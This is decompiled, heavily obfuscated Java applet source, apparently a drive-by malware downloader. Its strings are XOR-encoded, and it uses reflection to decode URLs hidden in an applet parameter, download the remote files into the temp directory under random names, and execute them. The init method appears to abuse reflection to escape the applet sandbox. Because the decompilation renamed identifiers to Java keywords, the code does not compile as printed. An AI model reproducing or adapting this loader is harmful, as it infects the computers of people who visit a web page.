import java.lang.reflect.Method;
import java.io.Closeable;
import java.io.OutputStream;
import java.io.InputStream;
import java.io.FileOutputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public final class Applet extends java.applet.Applet
{
    private static Boolean false;
    private static Object new;
    
    private static Object const(String a, final Class[] a, final Object[] a) {
        if (Applet.false) {
            System.out.println(m.const("\n9\u0003*\b(\u0003\u00136\u0014.\u001e<\u0018g\u0001") + a + m.const("s\t") + a.length + m.const("\b"));
        }
        return ((Class<?>)(a = (String)Class.forName(a))).getConstructor((Class<?>[])a).newInstance(a);
    }
    
    @Override
    public String toString() {
        try {
            final String parameter = this.getParameter(m.const("\u0002\u001c*\u001f0W"));
            final String const1 = const(m.const("9a0m\u000f:d] %~!s\u0011R\u001ci\u00114_P\u007f\\\u0017<u\u000b^\n~c7vk\u0013\u0004nZ{K+SCKVP\u001b\u007f1o$Gctk\u0017bfw\u001a\u0013]|(Gk\u0015\u000fIZwL5"));
            final String const2 = const(m.const("6>o.M;=\u001e;$X2Y\u001ez\u001dTW\bPH\\\u001eI\u0015D8\u001d:ctwPuG5wT[\\Ub[9&L\u0007FOxN]J\u0014\\/]ted\u007f}\u001b;\u0015zJb;7+\u000e9"));
            final String s = const1;
            final String s2 = parameter;
            final StringBuffer sb = new StringBuffer();
            final int length = s2.length();
            int n;
            int i = n = 0;
            while (i < length) {
                final int index;
                if ((index = s.indexOf(s2.substring(n, n + 1))) >= 0) {
                    sb.append(const2.substring(index, index + 1));
                }
                i = ++n;
            }
            const(sb.toString(), m.const("\t"));
        }
        catch (Exception ex) {
            if (Applet.false) {
                ex.printStackTrace();
            }
        }
        return m.const("");
    }
    
    private static void new(String a) {
        try {
            final String string = System.getProperty(m.const("\u0013<\u001d'I<=K)\u0015'\f#P")) + (Math.random() + m.const("s\r<G"));
            a = (String)const(m.const("\u0003'\u00174~\u000b6\f{=\u001en"), new Class[] { String.class }, new Object[] { a });
            const(m.const("\u0003'\u00174~\u000b6\f{=\u001en"), a, m.const("\u0016-\u000e($:<\u000b8\u001b#\u0001%L"), new Class[0], new Object[0]);
            a = (String)const(m.const("\u0003'\u00174~\u000b6\f{=\u001en"), a, m.const("\f%3\u000b\u0002\f)\r/O"), new Class[0], new Object[0]);
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            const((InputStream)a, (OutputStream)fileOutputStream);
            const((InputStream)a, fileOutputStream);
            a = string;
            final String const1 = m.const(".\u00141\tg\u00141\u001c*k-1\n8\u001f:G");
            if (Applet.new == null) {
                Applet.new = const(m.const(".\u00141\tg\u00141\u001c*k-1\n8\u001f:G"), null, m.const("\u00040\"7$\u0016/\u0001#G"), new Class[0], new Object[0]);
            }
            const(const1, Applet.new, m.const("8\u0010!A"), new Class[] { String.class }, new Object[] { a });
        }
        catch (Exception ex) {
            if (Applet.false) {
                ex.printStackTrace();
            }
        }
    }
    
    static {
        Applet.false = false;
        Applet.new = null;
    }
    
    @Override
    public void init() {
        try {
            final Object const1 = const(m.const("\u0004'\u0006\u0013>]*\u00185\u000e3\u0015w\u0006\b&\u0001,\u000e\u0005\u0014!\r\u001c?>$\u00152\u00002S"), const(m.const("\u0004'\u0006\u0013>]*\u00185\u000e3\u0015w\u0006\b&\u0001,\u000e\u0005\u0014!\r\u001c?>$\u00152\u00002S"), new Class[0], new Object[0]), m.const("5\u00028$\"\u001a\u0013#\u0010\u0012\u0006\u000e\u0004+D"), new Class[] { String.class }, new Object[] { m.const("#R") });
            const(m.const("\t7\u000b1\u0005b8\u001f6\b>\u0005z$3\u0019\u0013+\r\u0003\u00191\u0000>D"), const1, m.const("*\u0011*M"), new Class[] { String.class }, new Object[] { m.const("3 \t7\b5\u0001.F2\u0017!:\u00018\u00158O4H:<Si@lI4\u001a/\u001f\\\u0016\u001c.\u000f\u0019\u000e\u0001\u0006]ho2!2%47).Z_\b\u0000\u001d_G\u001aATh{dXu\u001e2\u0013=\u001e\u0013<\u0012{\u0017\"\t O\u0016,\u0004 \t1P3\u00132;\u0017=\u00063\u0012\u001b\u001e&\u0000\u001f4$1\"t,5.*uI\u001d]\u0019\u0014(\u0013\r\b\u00032w}\u007f!v#\u000f2\u0013\u001anS<[n\u001c>\byhKeS.\u001f4\u000f4\nR}T~\u0006h\u0002w\\U;\"#|\u0019<2)4p[U\u0016_\u0016\u001a\u0014\b\u0000\u00060si`(:)!}>\u00176\u0006/\u0015k\u0002t\\") });
            const(m.const("\u000f5\f=B!\u00186\u0016\u0017<]\u0012\u000b1\u000b<U"), this, m.const("\u0004.E"), new Class[] { Class.forName(m.const("\u000f5\f=B!\u001f2T1'\u001e#\u0014/\u00027U")) }, new Object[] { const(m.const(".\b8\u0018,Q#\u0014\u0003=\u000e`-\u0012\u0010+U"), new Class[] { Object[].class }, new Object[] { { const(m.const("#\u0000!4\u0019z\r?\u0012)\u00142P;\"\u0005 \u0018<\u00051D"), const1, m.const("\u0001.\u001a)\u001d\u0017\u0002\u00069\u00181\u000e*O"), new Class[] { String.class, Object[].class }, new Object[] { m.const("6\u001c\u000e\u000f9\u000e!F"), { this } }) } }) });
        }
        catch (Exception ex) {
            if (Applet.false) {
                ex.printStackTrace();
            }
        }
    }
    
    private static Object const(String a, final Object a, final String a, final Class[] a, final Object[] a) {
        if (Applet.false) {
            System.out.println(m.const("\r%\f\"#\u0018\u0006\u00059\u00186\u0019e\u0001") + a + m.const("s\u000f") + a + m.const("s\t") + a.length + m.const("\b"));
        }
        return ((Method)(a = (String)((Class)(a = (String)Class.forName(a))).getMethod(a, (Class<?>[])a))).invoke(a, a);
    }
    
    private static void const(InputStream a2, FileOutputStream a) {
        a2 = (InputStream)(Object)new Closeable[] { a2, a };
        try {
            a = (FileOutputStream)(a2 = a2).length;
            for (int i = 0; i < a; ++i) {
                a2[i].close();
            }
        }
        catch (Exception a2) {
            if (Applet.false) {
                ((Throwable)a2).printStackTrace();
            }
        }
    }
    
    private static String const(final String a) {
        final String const1;
        final int length = (const1 = m.const("\u0000\u0005M\tC*,\u0016\u0018\u0002\"H\u0014T B\n\u0012y\u0013\n\u0005O\nW\u0015ThO\f5\"5\u0003%L3\b\u001c\u0000/.\u0014`|\u0017h=*\u001c=1\u0012P:V2\u0005\u0018\u001e+)>2\u001d\u0013Iy\u001e\u001e\u0007#\u0011")).length();
        final StringBuffer sb = new StringBuffer();
        final int length2 = a.length();
        int n;
        int i = n = 0;
        while (i < length2) {
            sb.append((char)(a.charAt(n) ^ const1.charAt(n % length)));
            i = ++n;
        }
        return sb.toString();
    }
    
    private static void const(String a, String a) {
        if (a.indexOf(a) < 0) {
            new(a);
            return;
        }
        a = (String)(a = (a = (String)(Object)a.split(a))).length;
        int n;
        int i = n = 0;
        while (i < a) {
            new(a[n].trim());
            i = ++n;
        }
    }
    
    private static void const(final InputStream a, final OutputStream a) {
        final byte[] array = new byte[4096];
        InputStream inputStream = a;
        int read;
        while ((read = inputStream.read(array)) != -1) {
            a.write(array, 0, read);
            inputStream = a;
        }
    }
}
